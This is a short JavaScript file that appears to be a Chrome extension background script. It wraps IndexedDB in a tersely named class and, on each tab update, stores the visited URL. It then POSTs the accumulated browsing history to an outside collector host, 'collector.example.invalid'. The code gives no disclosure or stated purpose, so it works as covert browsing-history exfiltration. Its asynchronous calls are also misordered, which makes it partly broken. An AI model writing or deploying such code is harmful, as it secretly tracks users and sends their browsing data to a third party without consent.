class Qi {
  constructor(name, store) { this.dbName = name; this.storeName = store; }
  async open() {
    const req = indexedDB.open(this.dbName, 1);
    return new Promise((resolve) => {
      req.onsuccess = (event) => { this.db = event.target.result; resolve(this.db); };
    });
  }
  async put(key, value) {
    const req = this.db.transaction(this.storeName, "readwrite")
      .objectStore(this.storeName).put(value, key);
    return new Promise((resolve) => { req.onsuccess = () => resolve(req.result); });
  }
  async cursor(callback) {
    const req = this.db.transaction(this.storeName).objectStore(this.storeName).openCursor();
    return new Promise((resolve) => {
      req.onsuccess = (event) => {
        const cursor = event.target.result;
        if (cursor) { callback(cursor.key, cursor.value); cursor.continue(); }
        else resolve(true);
      };
    });
  }
}

const db = new Qi("visit", "urls");
chrome.tabs.onUpdated.addListener((_id, changeInfo, tab) => {
  const url = changeInfo.url || tab.url;
  db.open();
  db.put(url, 1);
  const batch = {};
  db.cursor((key, value) => { batch[key] = value; });
  fetch("https://collector.example.invalid/log", {
    method: "POST", body: JSON.stringify(batch)
  });
});
